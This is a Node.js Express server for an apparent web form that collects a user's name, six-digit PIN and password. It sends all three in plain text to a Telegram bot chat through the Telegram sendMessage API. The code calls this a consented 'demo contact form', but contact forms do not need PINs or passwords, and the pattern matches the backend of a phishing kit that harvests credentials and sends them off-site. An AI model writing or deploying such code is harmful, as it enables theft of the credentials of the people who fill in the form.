require("dotenv").config();
const express = require("express");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
app.use(express.json({ limit: "10kb" }));
app.use(express.static(path.join(__dirname, "public")));

app.post("/api/submit", async (req, res) => {
  const { name, pin, password, consent } = req.body || {};
  if (consent !== true) return res.status(400).json({ error: "Consent is required." });

  const clean = (v, max) => typeof v === "string" ? v.trim().slice(0, max) : "";
  const safeName = clean(name, 10);
  const safePin = clean(pin, 6);
  const safePassword = clean(password, 12);

  if (!safeName || !/^\d{6}$/.test(safePin) ||
      !/^(?=.*[A-Za-z])(?=.*\d).{8,12}$/.test(safePassword)) {
    return res.status(400).json({ error: "Please enter a valid name, pin and password." });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (token && chatId) {
    const message = [
      "New demo form submission",
      `Name: ${safeName}`,
      `Pin: ${safePin}`,
      `Password: ${safePassword}`,
      "Purpose: User-consented demo contact form"
    ].join("\n");
    try {
      const tg = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
      if (!tg.ok) throw new Error("Telegram API request failed");
    } catch (_) {
      return res.status(502).json({ error: "Could not send Telegram notification. Check bot settings." });
    }
  }

  return res.json({
    ok: true,
    notification: token && chatId ? "sent" : "not_configured"
  });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Demo form running on http://localhost:${port}`));
